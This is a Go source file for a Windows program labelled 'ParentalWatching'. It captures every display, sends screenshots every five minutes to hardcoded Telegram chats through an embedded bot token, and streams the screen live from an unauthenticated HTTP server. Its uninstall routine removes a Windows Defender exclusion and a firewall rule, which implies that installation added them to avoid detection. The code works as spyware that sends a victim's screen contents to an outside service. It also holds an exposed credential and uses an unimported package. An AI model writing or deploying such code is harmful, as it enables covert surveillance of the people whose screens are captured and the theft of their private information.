package main

import (
    "bytes"
    "fmt"
    "image"
    "image/jpeg"
    "log"
    "net"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strconv"
    "sync"
    "time"

    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
    "github.com/kbinani/screenshot"
)

var (
    botToken    = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
    allowedIDs  = []int64{1231232357345, 4385673485638, 23485673485} // Update with correct chat IDs
    port        = "5000"
    logFile     = ""
    mutex       sync.Mutex
    running     = true
    destFolder  = filepath.Join(os.Getenv("USERPROFILE"), "Downloads", "ParentalWatching")
)

func init() {
    // Set log file to %TEMP%\monitor_bot.log
    logFile = filepath.Join(os.Getenv("TEMP"), "monitor_bot.log")
    f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println("Failed to open log file:", err)
        return
    }
    log.SetOutput(f)
}

func logRotate() {
    mutex.Lock()
    defer mutex.Unlock()
    if info, err := os.Stat(logFile); err == nil && info.Size() > 10*1024*1024 {
        backup := fmt.Sprintf("%s.%s.bak", logFile, time.Now().Format("20060102150405"))
        os.Rename(logFile, backup)
        f, err := os.Create(logFile)
        if err != nil {
            log.Println("ERROR - Failed to create new log file:", err)
            return
        }
        log.SetOutput(f)
        f.Close()
    }
}

func captureScreen() (*image.RGBA, error) {
    n := screenshot.NumActiveDisplays()
    if n == 0 {
        return nil, fmt.Errorf("no active displays")
    }

    if n == 1 {
        bounds := screenshot.GetDisplayBounds(0)
        return screenshot.CaptureRect(bounds)
    }

    // Multiple screens: combine into one image
    var totalWidth, maxHeight int
    boundsList := make([]image.Rectangle, n)
    for i := 0; i < n; i++ {
        bounds := screenshot.GetDisplayBounds(i)
        boundsList[i] = bounds
        totalWidth += bounds.Dx()
        if bounds.Dy() > maxHeight {
            maxHeight = bounds.Dy()
        }
    }

    combined := image.NewRGBA(image.Rect(0, 0, totalWidth, maxHeight))
    offsetX := 0
    for i := 0; i < n; i++ {
        img, err := screenshot.CaptureRect(boundsList[i])
        if err != nil {
            return nil, err
        }
        for y := 0; y < img.Bounds().Dy(); y++ {
            for x := 0; x < img.Bounds().Dx(); x++ {
                combined.Set(x+offsetX, y, img.At(x, y))
            }
        }
        offsetX += img.Bounds().Dx()
    }
    return combined, nil
}

func sendToTelegram(bot *tgbotapi.BotAPI, img *image.RGBA) error {
    buf := new(bytes.Buffer)
    if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
        return err
    }

    for _, chatID := range allowedIDs {
        photo := tgbotapi.NewPhoto(chatID, tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: buf.Bytes()})
        if _, err := bot.Send(photo); err != nil {
            log.Println("ERROR - Telegram send to", chatID, ":", err)
        } else {
            log.Println("INFO - Sent screenshot to", chatID)
        }
    }
    return nil
}

func checkPort(port string) bool {
    ln, err := net.Listen("tcp", ":"+port)
    if err != nil {
        return false
    }
    ln.Close()
    return true
}

func startMJPEGServer() {
    for i := 0; i < 10; i++ {
        if checkPort(port) {
            break
        }
        p, err := strconv.Atoi(port)
        if err != nil {
            log.Println("ERROR - Failed to parse port:", err)
            return
        }
        p += 100
        port = strconv.Itoa(p)
        log.Println("INFO - Port", port, "in use, trying", p)
    }

    http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
        w.Header().Set("Pragma", "no-cache")
        w.Header().Set("Expires", "0")

        for running {
            img, err := captureScreen()
            if err != nil {
                log.Println("ERROR - MJPEG capture:", err)
                continue
            }
            buf := new(bytes.Buffer)
            if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
                log.Println("ERROR - MJPEG encode:", err)
                continue
            }
            _, err = w.Write([]byte("--frame\r\nContent-Type: image/jpeg\r\n\r\n"))
            if err != nil {
                return
            }
            _, err = w.Write(buf.Bytes())
            if err != nil {
                return
            }
            _, err = w.Write([]byte("\r\n"))
            if err != nil {
                return
            }
            time.Sleep(100 * time.Millisecond)
        }
    })

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "text/html")
        w.Write([]byte(`
            <html>
            <head>
                <title>Screen Preview</title>
                <style>
                    img { max-width: 100%; height: auto; }
                    body { margin: 0; padding: 10px; background: #000; }
                </style>
            </head>
            <body>
                <img src="/stream" alt="Live Screen Preview">
            </body>
            </html>
        `))
    })

    log.Println("INFO - Starting MJPEG server on localhost:" + port)
    go http.ListenAndServe(":"+port, nil)
}

func uninstall() {
    log.Println("INFO - Starting uninstall process")
    running = false

    // Delay to allow MJPEG server and Telegram bot to stop gracefully
    log.Println("DEBUG - Waiting 2 seconds for graceful shutdown")
    time.Sleep(2 * time.Second)

    // Remove Go
    goInstallDir := "C:\\Program Files\\Go"
    if _, err := os.Stat(goInstallDir); err == nil {
        log.Println("DEBUG - Attempting to uninstall Go")
        // Use wmic to find the Go 1.24.7 product code
        cmd := exec.Command("wmic", "product", "where", "name like 'Go Programming Language%'", "get", "IdentifyingNumber")
        output, err := cmd.CombinedOutput()
        if err != nil {
            log.Println("ERROR - Failed to get Go product code:", err)
        } else {
            productCode := string(output)
            productCode = strings.TrimSpace(strings.Replace(productCode, "IdentifyingNumber", "", -1))
            if productCode != "" {
                cmd = exec.Command("msiexec.exe", "/x", productCode, "/qn")
                if err := cmd.Run(); err != nil {
                    log.Println("ERROR - Failed to uninstall Go:", err)
                } else {
                    log.Println("INFO - Go uninstalled successfully")
                }
            } else {
                log.Println("ERROR - No Go product code found")
            }
        }
    } else {
        log.Println("DEBUG - Go not found at", goInstallDir)
    }

    // Remove scripts and folders
    files := []string{
        filepath.Join(destFolder, "monitoring.go"),
        filepath.Join(destFolder, "monitoring.exe"),
        filepath.Join(destFolder, "go.mod"),
        filepath.Join(destFolder, "go.sum"),
        filepath.Join(destFolder, "install_and_run.ps1"),
        filepath.Join(destFolder, "go_run_error.log"),
        filepath.Join(destFolder, "go_run_output.log"),
        filepath.Join(destFolder, "go_mod_error.log"),
        filepath.Join(destFolder, "go_mod_output.log"),
        filepath.Join(destFolder, "go_get_error.log"),
        filepath.Join(destFolder, "go_get_output.log"),
        filepath.Join(destFolder, "go_build_error.log"),
        filepath.Join(destFolder, "go_build_output.log"),
    }
    log.Println("DEBUG - Removing files")
    for _, file := range files {
        if _, err := os.Stat(file); err == nil {
            if err := os.Remove(file); err != nil {
                log.Println("ERROR - Failed to delete", file, ":", err)
            } else {
                log.Println("INFO - Deleted", file)
            }
        }
    }

    // Remove ParentalWatching folder
    log.Println("DEBUG - Removing folder", destFolder)
    if err := os.RemoveAll(destFolder); err != nil {
        log.Println("ERROR - Failed to delete folder", destFolder, ":", err)
    } else {
        log.Println("INFO - Deleted folder", destFolder)
    }

    // Remove environment variables
    log.Println("DEBUG - Removing PATH entry")
    cmd := exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('Path', [Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine).Replace(';C:\\Program Files\\Go\\bin', ''), [System.EnvironmentVariableTarget]::Machine)")
    if err := cmd.Run(); err != nil {
        log.Println("ERROR - Failed to remove PATH:", err)
    } else {
        log.Println("INFO - Removed Go from PATH")
    }

    log.Println("DEBUG - Removing GOROOT")
    cmd = exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('GOROOT', '', [System.EnvironmentVariableTarget]::Machine)")
    if err := cmd.Run(); err != nil {
        log.Println("ERROR - Failed to remove GOROOT:", err)
    } else {
        log.Println("INFO - Removed GOROOT")
    }

    // Remove Defender exclusion
    log.Println("DEBUG - Removing Defender exclusion")
    cmd = exec.Command("powershell", "-Command", "Remove-MpPreference -ExclusionPath '" + destFolder + "'")
    if err := cmd.Run(); err != nil {
        log.Println("ERROR - Failed to remove Defender exclusion:", err)
    } else {
        log.Println("INFO - Removed Defender exclusion")
    }

    // Remove Firewall rule
    log.Println("DEBUG - Removing firewall rule")
    cmd = exec.Command("powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow ParentalWatching Go Apps' -ErrorAction SilentlyContinue")
    if err := cmd.Run(); err != nil {
        log.Println("ERROR - Failed to remove firewall rule:", err)
    } else {
        log.Println("INFO - Removed firewall rule")
    }

    // Close the parent Command Prompt or PowerShell window
    log.Println("DEBUG - Closing parent console")
    cmd = exec.Command("powershell", "-Command", "Stop-Process -Id $PID")
    if err := cmd.Start(); err != nil {
        log.Println("ERROR - Failed to close parent console:", err)
    }

    log.Println("INFO - Uninstallation complete")
    // Delay exit to ensure logs are written
    time.Sleep(1 * time.Second)
    os.Exit(0)
}

func main() {
    log.Println("INFO - Bot starting")
    bot, err := tgbotapi.NewBotAPI(botToken)
    if err != nil {
        log.Fatalf("ERROR - Failed to initialize bot: %v", err)
    }

    startMJPEGServer()

    go func() {
        for running {
            logRotate()
            img, err := captureScreen()
            if err != nil {
                log.Println("ERROR - Capture:", err)
            } else {
                if err := sendToTelegram(bot, img); err != nil {
                    log.Println("ERROR - Telegram:", err)
                }
            }
            time.Sleep(300 * time.Second)
        }
    }()

    u := tgbotapi.NewUpdate(0)
    u.Timeout = 60
    updates := bot.GetUpdatesChan(u)

    for update := range updates {
        if update.Message == nil || update.Message.Chat == nil {
            continue
        }

        chatID := update.Message.Chat.ID
        allowed := false
        for _, id := range allowedIDs {
            if chatID == id {
                allowed = true
                break
            }
        }
        if !allowed {
            log.Println("INFO - Unauthorized user:", chatID)
            continue
        }

        if update.Message.IsCommand() {
            switch update.Message.Command() {
            case "screenshot":
                img, err := captureScreen()
                if err != nil {
                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to capture screenshot: "+err.Error()))
                    log.Println("ERROR - /screenshot:", err)
                    continue
                }
                if err := sendToTelegram(bot, img); err != nil {
                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to send screenshot: "+err.Error()))
                    log.Println("ERROR - /screenshot send:", err)
                }
            case "uninstall":
                bot.Send(tgbotapi.NewMessage(chatID, "Uninstalling..."))
                uninstall()
            }
        }
    }
}
